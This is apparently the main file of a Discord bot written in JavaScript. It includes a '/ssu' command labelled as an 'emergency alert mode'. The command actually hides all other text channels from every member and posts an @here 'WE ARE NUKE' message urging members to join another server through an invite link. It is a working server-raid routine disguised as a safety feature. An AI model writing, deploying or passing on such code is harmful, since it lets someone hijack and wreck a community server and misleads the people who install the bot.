// core.js
const { Client, GatewayIntentBits, Collection } = require('discord.js');
const fs = require('fs');
require('dotenv').config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.commands = new Collection();

// Load commands dynamically
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  client.commands.set(command.data.name, command);
}

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) return;

  try {
    await command.execute(interaction);
  } catch (error) {
    console.error(error);
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ content: '❌ There was an error executing this command.', ephemeral: true });
    } else {
      await interaction.reply({ content: '❌ There was an error executing this command.', ephemeral: true });
    }
  }
});

// Example inline /ssu command (if you prefer not to keep it in /commands/ssu.js)
const { SlashCommandBuilder, PermissionFlagsBits } = require('discord.js');
const ssuCommand = {
  data: new SlashCommandBuilder()
    .setName('ssu')
    .setDescription('Trigger emergency alert mode')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .setDMPermission(false),
  async execute(interaction) {
    const guild = interaction.guild;
    const emergencyChannel = interaction.channel;

    // Lock down all other channels
    guild.channels.cache.forEach(channel => {
      if (channel.id !== emergencyChannel.id && channel.isTextBased()) {
        channel.permissionOverwrites.edit(guild.roles.everyone, {
          SendMessages: false,
          ViewChannel: false,
        }).catch(err => console.error(`Failed to lock ${channel.name}:`, err));
      }
    });

    // Emergency announcement
    const message = `@here\n\n# 🚨 JOIN THIS SERVER 🚨\n**EVACUATE CURRENT — WE ARE NUKE**\n\nLINK = https://discord.gg/XZxdJHGD2W`;

    try {
      await emergencyChannel.send(message);
      await emergencyChannel.send('⚠️ Emergency mode activated. All other channels are locked.');
      await interaction.reply({ content: '✅ Emergency alert sent.', ephemeral: true });
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Could not send the emergency alert.', ephemeral: true });
    }
  },
};

// Register inline command
client.commands.set(ssuCommand.data.name, ssuCommand);

client.login(process.env.TOKEN);
